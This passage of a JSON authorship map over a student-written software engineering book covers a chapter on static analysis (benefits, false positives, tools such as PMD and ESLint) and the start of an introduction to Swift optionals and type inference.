          "gitId": "iskandarzulkarnaien"
        },
        "content": "\t* [Improve Code Quality‎](#improve-code-quality)"
      },
      {
        "lineNumber": 26,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "* [Limitation of Static Analysis‎](#limitation-of-static-analysis)"
      },
      {
        "lineNumber": 27,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "\t* [False positives‎](#false-positives)"
      },
      {
        "lineNumber": 28,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "\t* [Cannot Catch Error Introduced in Runtime Environment‎](#cannot-catch-error-introduced-in-runtime-environment)"
      },
      {
        "lineNumber": 29,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "* [How to Do Static Analysis (Static Analysis Tools)‎](#how-to-do-static-analysis-static-analysis-tools)"
      },
      {
        "lineNumber": 30,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "* [References‎](#references)"
      },
      {
        "lineNumber": 31,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "\u003c/box\u003e"
      },
      {
        "lineNumber": 32,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": ""
      },
      {
        "lineNumber": 33,
        "author": {
          "gitId": "-"
        },
        "content": "## Overview"
      },
      {
        "lineNumber": 34,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 35,
        "author": {
          "gitId": "-"
        },
        "content": "Static analysis is the process of analysing computer programme **without** executing the code. This practice is often used to ensure that codes follow certain structures or standards (e.g coding standards)."
      },
      {
        "lineNumber": 36,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 37,
        "author": {
          "gitId": "-"
        },
        "content": "It is possible to do static analysis manually, but there are automated tools(static analysers) that can assist developers in this process. "
      },
      {
        "lineNumber": 38,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 39,
        "author": {
          "gitId": "-"
        },
        "content": "## Why Static Analysis?"
      },
      {
        "lineNumber": 40,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 41,
        "author": {
          "gitId": "-"
        },
        "content": "### Analyse Thoroughly"
      },
      {
        "lineNumber": 42,
        "author": {
          "gitId": "-"
        },
        "content": "In some situations, it is impossible to achieve 100% test coverage. There will be some sections in the code that are not covered by test cases, which may result in bugs ([see](#find-potential-bugs-early) how static analysis will help you find bugs). In static analysis, all the related files/codes will be analysed."
      },
      {
        "lineNumber": 43,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 44,
        "author": {
          "gitId": "-"
        },
        "content": "### Find Potential Bugs Early"
      },
      {
        "lineNumber": 45,
        "author": {
          "gitId": "-"
        },
        "content": "Static analysis can find bugs before the execution. For example, some programmers may forget to add `break` statement in `switch` statement."
      },
      {
        "lineNumber": 46,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 47,
        "author": {
          "gitId": "-"
        },
        "content": "``` java"
      },
      {
        "lineNumber": 48,
        "author": {
          "gitId": "-"
        },
        "content": "switch(colour) {"
      },
      {
        "lineNumber": 49,
        "author": {
          "gitId": "-"
        },
        "content": "case \u0027blue\u0027:"
      },
      {
        "lineNumber": 50,
        "author": {
          "gitId": "-"
        },
        "content": "\tvalue \u003d 1;"
      },
      {
        "lineNumber": 51,
        "author": {
          "gitId": "-"
        },
        "content": "case \u0027green\u0027:"
      },
      {
        "lineNumber": 52,
        "author": {
          "gitId": "-"
        },
        "content": "\tvalue \u003d 2;"
      },
      {
        "lineNumber": 53,
        "author": {
          "gitId": "-"
        },
        "content": "}"
      },
      {
        "lineNumber": 54,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 55,
        "author": {
          "gitId": "-"
        },
        "content": "Static analysis tools will automatically alert the programmers about the potential problems/bugs."
      },
      {
        "lineNumber": 56,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 57,
        "author": {
          "gitId": "-"
        },
        "content": "### Enforce a Standard in Project"
      },
      {
        "lineNumber": 58,
        "author": {
          "gitId": "-"
        },
        "content": "Many projects enforce certain coding standards. For example, some project require the following format for `if` statement."
      },
      {
        "lineNumber": 59,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 60,
        "author": {
          "gitId": "-"
        },
        "content": "``` java"
      },
      {
        "lineNumber": 61,
        "author": {
          "gitId": "-"
        },
        "content": "if (condition) {"
      },
      {
        "lineNumber": 62,
        "author": {
          "gitId": "-"
        },
        "content": "\t// true"
      },
      {
        "lineNumber": 63,
        "author": {
          "gitId": "-"
        },
        "content": "} else {"
      },
      {
        "lineNumber": 64,
        "author": {
          "gitId": "-"
        },
        "content": "\t// false"
      },
      {
        "lineNumber": 65,
        "author": {
          "gitId": "-"
        },
        "content": "}"
      },
      {
        "lineNumber": 66,
        "author": {
          "gitId": "-"
        },
        "content": "``` "
      },
      {
        "lineNumber": 67,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 68,
        "author": {
          "gitId": "-"
        },
        "content": "While others enforce the following standard:"
      },
      {
        "lineNumber": 69,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 70,
        "author": {
          "gitId": "-"
        },
        "content": "``` java"
      },
      {
        "lineNumber": 71,
        "author": {
          "gitId": "-"
        },
        "content": "if (condition) {"
      },
      {
        "lineNumber": 72,
        "author": {
          "gitId": "-"
        },
        "content": "\t// true"
      },
      {
        "lineNumber": 73,
        "author": {
          "gitId": "-"
        },
        "content": "}"
      },
      {
        "lineNumber": 74,
        "author": {
          "gitId": "-"
        },
        "content": "else {"
      },
      {
        "lineNumber": 75,
        "author": {
          "gitId": "-"
        },
        "content": "\t// false"
      },
      {
        "lineNumber": 76,
        "author": {
          "gitId": "-"
        },
        "content": "}"
      },
      {
        "lineNumber": 77,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 78,
        "author": {
          "gitId": "-"
        },
        "content": "Such standards can be configured in static analysis tools and the tools will help you enforce the standards."
      },
      {
        "lineNumber": 79,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 80,
        "author": {
          "gitId": "-"
        },
        "content": "### Improve Code Quality"
      },
      {
        "lineNumber": 81,
        "author": {
          "gitId": "-"
        },
        "content": "Static analysis will pick up common pitfalls in coding and suggest changes to help you improve your code quality. For example, for the following Java code:"
      },
      {
        "lineNumber": 82,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 83,
        "author": {
          "gitId": "-"
        },
        "content": "``` java"
      },
      {
        "lineNumber": 84,
        "author": {
          "gitId": "-"
        },
        "content": "if (isConditionTrue()) {"
      },
      {
        "lineNumber": 85,
        "author": {
          "gitId": "-"
        },
        "content": "\treturn true;"
      },
      {
        "lineNumber": 86,
        "author": {
          "gitId": "-"
        },
        "content": "} else {"
      },
      {
        "lineNumber": 87,
        "author": {
          "gitId": "-"
        },
        "content": "\treturn false;"
      },
      {
        "lineNumber": 88,
        "author": {
          "gitId": "-"
        },
        "content": "}"
      },
      {
        "lineNumber": 89,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 90,
        "author": {
          "gitId": "-"
        },
        "content": "Majority of static analysis tools will point out that this can be simplified to:"
      },
      {
        "lineNumber": 91,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 92,
        "author": {
          "gitId": "-"
        },
        "content": "``` java"
      },
      {
        "lineNumber": 93,
        "author": {
          "gitId": "-"
        },
        "content": "return isConditionTrue();"
      },
      {
        "lineNumber": 94,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 95,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 96,
        "author": {
          "gitId": "-"
        },
        "content": "## Limitation of Static Analysis"
      },
      {
        "lineNumber": 97,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 98,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "### False Positives"
      },
      {
        "lineNumber": 99,
        "author": {
          "gitId": "-"
        },
        "content": "Since static analysis tools only recognize patterns, there might be false positives introduced."
      },
      {
        "lineNumber": 100,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 101,
        "author": {
          "gitId": "-"
        },
        "content": "``` java"
      },
      {
        "lineNumber": 102,
        "author": {
          "gitId": "-"
        },
        "content": "try {"
      },
      {
        "lineNumber": 103,
        "author": {
          "gitId": "-"
        },
        "content": "\t// logic part"
      },
      {
        "lineNumber": 104,
        "author": {
          "gitId": "-"
        },
        "content": "} catch (Throwable t) {"
      },
      {
        "lineNumber": 105,
        "author": {
          "gitId": "-"
        },
        "content": "\t// alert user"
      },
      {
        "lineNumber": 106,
        "author": {
          "gitId": "-"
        },
        "content": "}"
      },
      {
        "lineNumber": 107,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 108,
        "author": {
          "gitId": "-"
        },
        "content": "For example, the above code will catch any `Throwable` object and alert users that a fatal error has occurred in the system. In many static analysis tools, catching `Throwable` is regarded as a bad practice and thus the tools will prompt the error to developers. However, in this case, we want to provide a friendly alert for system crash instead of showing an ugly stack track. It is acceptable to catch `Throwable` and thus the violation detected by static analysis tools is a false positive."
      },
      {
        "lineNumber": 109,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 110,
        "author": {
          "gitId": "-"
        },
        "content": "**Solution**: Many static analysis tools provide ways to suppress the warnings. For example, in [PMD](PMD.html) (a static analysis tool), `@SuppressWarnings` annotation can be used. In this case,"
      },
      {
        "lineNumber": 111,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 112,
        "author": {
          "gitId": "-"
        },
        "content": "``` java "
      },
      {
        "lineNumber": 113,
        "author": {
          "gitId": "-"
        },
        "content": "@SuppressWarnings(\"PMD.AvoidCatchingThrowable\") // used as fallback"
      },
      {
        "lineNumber": 114,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 115,
        "author": {
          "gitId": "-"
        },
        "content": "is the correct way to suppress warnings."
      },
      {
        "lineNumber": 116,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 117,
        "author": {
          "gitId": "-"
        },
        "content": "### Cannot Catch Error Introduced in Runtime Environment"
      },
      {
        "lineNumber": 118,
        "author": {
          "gitId": "-"
        },
        "content": "Since static analysis is done without executing the programme. Some vulnerabilities that are introduced in the runtime cannot be caught. Thus, you should **not** merely depend on static analysis tools to find bugs. Comprehensive test cases are also needed to verify the functionalities in logic, UI and etc."
      },
      {
        "lineNumber": 119,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 120,
        "author": {
          "gitId": "-"
        },
        "content": "## How to Do Static Analysis (Static Analysis Tools)"
      },
      {
        "lineNumber": 121,
        "author": {
          "gitId": "-"
        },
        "content": "There are several static analysis tools that can be used to assist the process."
      },
      {
        "lineNumber": 122,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 123,
        "author": {
          "gitId": "-"
        },
        "content": "- [List of tools for static code analysis - Wikipedia](https://en.wikipedia.org/wiki/List_of_tools_for_static_code_analysis): You can find static analysis tools that supports the language you use."
      },
      {
        "lineNumber": 124,
        "author": {
          "gitId": "-"
        },
        "content": "- [Codacy - Automated code reviews \u0026 code analytics](https://www.codacy.com/): A code reviews tool that has integrated different static analysis tools. It can show data or statistics reported by different static analysis tools for each commit."
      },
      {
        "lineNumber": 125,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 126,
        "author": {
          "gitId": "-"
        },
        "content": "Here, we will introduce several well-known ones in detail. You can click the hyperlinks to look through them. We organised them by languages."
      },
      {
        "lineNumber": 127,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 128,
        "author": {
          "gitId": "-"
        },
        "content": "- Java"
      },
      {
        "lineNumber": 129,
        "author": {
          "gitId": "-"
        },
        "content": "\t- [CheckStyle](checkStyle.html)"
      },
      {
        "lineNumber": 130,
        "author": {
          "gitId": "-"
        },
        "content": "\t- [PMD](PMD.html)"
      },
      {
        "lineNumber": 131,
        "author": {
          "gitId": "-"
        },
        "content": "\t- [FindBugs](FindBugs.html)"
      },
      {
        "lineNumber": 132,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 133,
        "author": {
          "gitId": "-"
        },
        "content": "- JavaScript"
      },
      {
        "lineNumber": 134,
        "author": {
          "gitId": "-"
        },
        "content": "\t- [eslint](ESLint.html)"
      },
      {
        "lineNumber": 135,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 136,
        "author": {
          "gitId": "-"
        },
        "content": "## References"
      },
      {
        "lineNumber": 137,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 138,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "- [Why Static Code Analysis is Important?](https://javarevisited.blogspot.sg/2014/02/why-static-code-analysis-is-important.html)"
      },
      {
        "lineNumber": 139,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 140,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/div\u003e"
      }
    ],
    "authorContributionMap": {
      "Tejas2805": 1,
      "jamessspanggg": 1,
      "iskandarzulkarnaien": 15,
      "-": 123
    }
  },
  {
    "path": "contents/swift/welcome-to-swift.md",
    "fileType": "md",
    "lines": [
      {
        "lineNumber": 1,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cfrontmatter\u003e"
      },
      {
        "lineNumber": 2,
        "author": {
          "gitId": "-"
        },
        "content": "  title: Swift"
      },
      {
        "lineNumber": 3,
        "author": {
          "gitId": "-"
        },
        "content": "  header: pagetop.md"
      },
      {
        "lineNumber": 4,
        "author": {
          "gitId": "-"
        },
        "content": "  footer: footer.md"
      },
      {
        "lineNumber": 5,
        "author": {
          "gitId": "-"
        },
        "content": "  head: head.md"
      },
      {
        "lineNumber": 6,
        "author": {
          "gitId": "-"
        },
        "content": "  siteNav: mainNav.md"
      },
      {
        "lineNumber": 7,
        "author": {
          "gitId": "-"
        },
        "content": "  pageNav: 3"
      },
      {
        "lineNumber": 8,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/frontmatter\u003e"
      },
      {
        "lineNumber": 9,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 10,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cdiv class\u003d\"website-content\"\u003e"
      },
      {
        "lineNumber": 11,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 12,
        "author": {
          "gitId": "-"
        },
        "content": "{{ booktitle | safe }}"
      },
      {
        "lineNumber": 13,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 14,
        "author": {
          "gitId": "-"
        },
        "content": "# Swift"
      },
      {
        "lineNumber": 15,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 16,
        "author": {
          "gitId": "-"
        },
        "content": "**Authors: [Ch\u0027ng Ming Shin](https://github.com/ablyx/cs3281-website/blob/mingshin-week6-progress/students/AY1617S2/ch\u0027ngMingShin/Ch\u0027ngMingShin-Resume.md), [Jiang Chunhui](https://github.com/Adoby7), [Yong Zhi Yuan](https://github.com/Zhiyuan-Amos)**"
      },
      {
        "lineNumber": 17,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 18,
        "author": {
          "gitId": "-"
        },
        "content": "Reviewers: [Aaron Chong](https://github.com/acjh), [Bryan Lew](https://github.com/blewjy), [Dickson Tan](https://github.com/Neurrone), [Rachael Sim](https://github.com/rachx), [Rahul Rajesh](https://github.com/rrtheonlyone), [Sam Yong](https://github.com/mauris), [Tan Wang Leng](https://github.com/yamgent), [Vivek Lakshmanan](https://github.com/vivekscl), [Wang Junming](https://github.com/junming403), [Xiao Pu](https://github.com/xpdavid)"
      },
      {
        "lineNumber": 19,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 20,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "\u003cbox id\u003d\"article-toc\"\u003e"
      },
      {
        "lineNumber": 21,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": ""
      },
      {
        "lineNumber": 22,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "* [Swift Overview‎](#swift-overview)"
      },
      {
        "lineNumber": 23,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "* [Noteworthy Swift Features‎](#noteworthy-swift-features)"
      },
      {
        "lineNumber": 24,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "    * [Type Inference‎](#type-inference)"
      },
      {
        "lineNumber": 25,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "    * [Optionals‎](#optionals)"
      },
      {
        "lineNumber": 26,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "    * [Defer Statements‎](#defer-statements)"
      },
      {
        "lineNumber": 27,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "    * [Data Types‎](#data-types)"
      },
      {
        "lineNumber": 28,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "    * [Protocol Oriented Programming‎](#protocol-oriented-programming)"
      },
      {
        "lineNumber": 29,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "    * [Extensions‎](#extensions)"
      },
      {
        "lineNumber": 30,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "    * [Automatic Reference Counting‎](#automatic-reference-counting)"
      },
      {
        "lineNumber": 31,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "    * [CocoaPods‎](#cocoapods)"
      },
      {
        "lineNumber": 32,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "* [How to Get Started‎](#how-to-get-started)"
      },
      {
        "lineNumber": 33,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "\u003c/box\u003e"
      },
      {
        "lineNumber": 34,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": ""
      },
      {
        "lineNumber": 35,
        "author": {
          "gitId": "-"
        },
        "content": "## Swift Overview"
      },
      {
        "lineNumber": 36,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 37,
        "author": {
          "gitId": "-"
        },
        "content": "**Swift is the main programming language used for iOS programming.** Introduced in 2014 by Apple, Swift has more concise and more expressive syntax compared to its predecessor language [Objective-C](). Unlike most other software by Apple, Swift is [open source](https://github.com/apple/swift)."
      },
      {
        "lineNumber": 38,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 39,
        "author": {
          "gitId": "-"
        },
        "content": "**One main attraction to learn Swift\u0027s is that iOS developers are well paid** ([example](https://www.indeed.com/salaries/iOS-Developer-Salaries))."
      },
      {
        "lineNumber": 40,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 41,
        "author": {
          "gitId": "-"
        },
        "content": "Swift syntax is not too different from other mainstream languages such as Python, Java or C++, which means switching to Swift is not difficult. On top of that, Swift also supports [_playgrounds_](), a feature that allows programmers to experiment with Swift code and see the results immediately, without the overhead of building and running an app."
      },
      {
        "lineNumber": 42,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 43,
        "author": {
          "gitId": "-"
        },
        "content": "## Noteworthy Swift Features"
      },
      {
        "lineNumber": 44,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 45,
        "author": {
          "gitId": "-"
        },
        "content": "Here are some noteworthy Swift features for you to get a feel of Swift."
      },
      {
        "lineNumber": 46,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 47,
        "author": {
          "gitId": "-"
        },
        "content": "### Type Inference"
      },
      {
        "lineNumber": 48,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 49,
        "author": {
          "gitId": "-"
        },
        "content": "Swift supports type inference whereby the compiler automatically deduces the type of a variable during compilation by examining the values assigned to it. "
      },
      {
        "lineNumber": 50,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 51,
        "author": {
          "gitId": "-"
        },
        "content": "```swift"
      },
      {
        "lineNumber": 52,
        "author": {
          "gitId": "-"
        },
        "content": "var str1: String \u003d \"foo\""
      },
      {
        "lineNumber": 53,
        "author": {
          "gitId": "-"
        },
        "content": "var str2 \u003d \"foo\" // compiler infers that str2 is of type String"
      },
      {
        "lineNumber": 54,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 55,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 56,
        "author": {
          "gitId": "-"
        },
        "content": "Unlike **Python** or **JavaScript** which are dynamically typed, variables in Swift are statically typed. Statically-typed languages have will have the code checked at compile-time instead of run-time, which eliminates many (often) trivial bugs early, which in turn makes debugging the program easier."
      },
      {
        "lineNumber": 57,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 58,
        "author": {
          "gitId": "-"
        },
        "content": "```swift"
      },
      {
        "lineNumber": 59,
        "author": {
          "gitId": "-"
        },
        "content": "var str2 \u003d \"foo\" // compiler infers that str2 is of type String"
      },
      {
        "lineNumber": 60,
        "author": {
          "gitId": "-"
        },
        "content": "str2 \u003d 5 // compilation error"
      },
      {
        "lineNumber": 61,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 62,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 63,
        "author": {
          "gitId": "-"
        },
        "content": "### Optionals"
      },
      {
        "lineNumber": 64,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 65,
        "author": {
          "gitId": "-"
        },
        "content": "Swift allows the use of `Optionals`, so that you can choose to either return nil or a data value, instead of returning a special value to indicate the absence of a value."
      },
      {
        "lineNumber": 66,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 67,
        "author": {
          "gitId": "-"
        },
        "content": "```swift"
      },
      {
        "lineNumber": 68,
        "author": {
          "gitId": "-"
        },
        "content": "func yearAlbumReleased(name: String) -\u003e Int {"
      },
      {
        "lineNumber": 69,
        "author": {
          "gitId": "-"
        },
        "content": "    switch name {"
      },
      {
        "lineNumber": 70,
        "author": {
          "gitId": "-"
        },
        "content": "    case \"Taylor Swift\": return 2006"
      },
      {
        "lineNumber": 71,
        "author": {
          "gitId": "-"
        },
        "content": "    case \"Fearless\": return 2008"
      },
      {
        "lineNumber": 72,
        "author": {
          "gitId": "-"
        },
        "content": "    case \"Speak Now\": return 2010"
      },
      {
        "lineNumber": 73,
        "author": {
          "gitId": "-"
        },
        "content": "    case \"Red\": return 2012"
      },
      {
        "lineNumber": 74,
        "author": {
          "gitId": "-"
        },
        "content": "    case \"1989\": return 2014"
      },
      {
        "lineNumber": 75,
        "author": {
          "gitId": "-"
        },
        "content": "    default:"
      },
      {
        "lineNumber": 76,
        "author": {
          "gitId": "-"
        },
        "content": "        return -1 // Special value, but is not meaningful to other developers"
      },
      {
        "lineNumber": 77,
        "author": {
          "gitId": "-"
        },
        "content": "    }"
      },
      {
        "lineNumber": 78,
        "author": {
          "gitId": "-"
        },
        "content": "}"
      },
      {
        "lineNumber": 79,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 80,
        "author": {
          "gitId": "-"
        },
        "content": "Without Optionals, you might consider using -1 to indicate that there was no such album. However, if someone else uses this function, he may not know that -1 means \"no such album\", and it would be better if we could return nil?"
      },
      {
        "lineNumber": 81,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 82,
        "author": {
          "gitId": "-"
        },
        "content": "```swift"
      },
      {
        "lineNumber": 83,
        "author": {
          "gitId": "-"
        },
        "content": "func yearAlbumReleased(name: String) -\u003e Int? { // \"?\" indicates the return value type is an optional."
      },
      {
        "lineNumber": 84,
        "author": {
          "gitId": "-"
        },
        "content": "    switch name {"
      },
      {
        "lineNumber": 85,
        "author": {
          "gitId": "-"
        },
        "content": "    case \"Taylor Swift\": return 2006"
      },
      {
        "lineNumber": 86,
        "author": {
          "gitId": "-"
        },
        "content": "    case \"Fearless\": return 2008"
      },
      {
        "lineNumber": 87,
        "author": {
          "gitId": "-"
        },
        "content": "    case \"Speak Now\": return 2010"
      },
      {
        "lineNumber": 88,
        "author": {
          "gitId": "-"
        },
        "content": "    case \"Red\": return 2012"
      },
      {
        "lineNumber": 89,
        "author": {
          "gitId": "-"
        },
        "content": "    case \"1989\": return 2014"
      },
      {
        "lineNumber": 90,
        "author": {
          "gitId": "-"
        },
        "content": "    default:"
      },
      {
        "lineNumber": 91,
        "author": {
          "gitId": "-"
        },
        "content": "        return nil"
      },
      {
        "lineNumber": 92,
        "author": {
          "gitId": "-"
        },
        "content": "    }"
      },
      {
        "lineNumber": 93,
        "author": {
          "gitId": "-"
        },
        "content": "}"
      },
      {
        "lineNumber": 94,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 95,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 96,
        "author": {
          "gitId": "-"
        },
        "content": "#### Optional Binding"
      },
      {
        "lineNumber": 97,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 98,
        "author": {
          "gitId": "-"
        },
        "content": "Then, you can unwrap the Optional safely using an `if-let` statement to distinguish whether it is `nil` or not, and handle them separately:"
      },
      {
        "lineNumber": 99,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 100,
        "author": {
          "gitId": "-"
        },
        "content": "```swift"
      },
      {
        "lineNumber": 101,
        "author": {
          "gitId": "-"
        },
        "content": "func timeTravel(album: String) {"
      },
      {
        "lineNumber": 102,
        "author": {
          "gitId": "-"
        },
        "content": "    let year \u003d yearAlbumReleased(album)"
      },
      {
        "lineNumber": 103,
        "author": {
          "gitId": "-"
        },
        "content": "    if let past \u003d year { "
      },
      {
        "lineNumber": 104,
        "author": {
          "gitId": "-"
        },
        "content": "        // year contains a non-nil value"
      },
      {
        "lineNumber": 105,
        "author": {
          "gitId": "-"
        },
        "content": "        // past is of type Int (not Int?) with the value stored in year"
      },
      {
        "lineNumber": 106,
        "author": {
          "gitId": "-"
        },
        "content": "    } else { "
      },
      {
        "lineNumber": 107,
        "author": {
          "gitId": "-"
        },
        "content": "        // year contains a nil value"
      },
      {
        "lineNumber": 108,
        "author": {
          "gitId": "-"
        },
        "content": "    }"
      },
      {
        "lineNumber": 109,
        "author": {
          "gitId": "-"
        },
        "content": "}"
      },
      {
        "lineNumber": 110,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 111,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 112,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 113,
        "author": {
          "gitId": "-"
        },
        "content": "If you would like to read up more about optionals, take a look at these articles:"
      },
      {
        "lineNumber": 114,
        "author": {
          "gitId": "-"
        },
        "content": "* [Swift optionals explained simply](https://hackernoon.com/swift-optionals-explained-simply-e109a4297298)"
      },
      {
        "lineNumber": 115,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "* [What is an optional value in Swift?](https://stackoverflow.com/questions/24003642/what-is-an-optional-value-in-swift)"
      },
      {
        "lineNumber": 116,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 117,
        "author": {
          "gitId": "-"
        },
        "content": "#### Guard Statements"
      },
      {
        "lineNumber": 118,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 119,
        "author": {
          "gitId": "-"
        },
        "content": "Notice that the [happy path](http://xunitpatterns.com/happy%20path.html) in the code above is indented:"
      },
      {
        "lineNumber": 120,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 121,
        "author": {
          "gitId": "-"
        },
        "content": "```swift"
      },
      {
        "lineNumber": 122,
        "author": {
          "gitId": "-"
        },
        "content": "func timeTravel(album: String) {"
      },
      {
        "lineNumber": 123,
        "author": {
          "gitId": "-"
        },
        "content": "    let year \u003d yearAlbumReleased(album)"
      },
      {
        "lineNumber": 124,
        "author": {
          "gitId": "-"
        },
        "content": "    if let past \u003d year {"
      },
      {
        "lineNumber": 125,
        "author": {
          "gitId": "-"
        },
        "content": "        // happy path is indented"
      },
      {
        "lineNumber": 126,
        "author": {
          "gitId": "-"
        },
        "content": "        // past contains the non-nil value of year; proceed to do something with past"
      },
      {
        "lineNumber": 127,
        "author": {
          "gitId": "-"
        },
        "content": "    } else { "
      },
      {
        "lineNumber": 128,
        "author": {
          "gitId": "-"
        },
        "content": "        // failure case"
      },
      {
        "lineNumber": 129,
        "author": {
          "gitId": "-"
        },
        "content": "    }"
      },
      {
        "lineNumber": 130,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 131,
        "author": {
          "gitId": "-"
        },
        "content": "    // past is no longer defined; unable to use past here"
      },
      {
        "lineNumber": 132,
        "author": {
          "gitId": "-"
        },
        "content": "}"
      },
      {
        "lineNumber": 133,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 134,
        "author": {
          "gitId": "-"
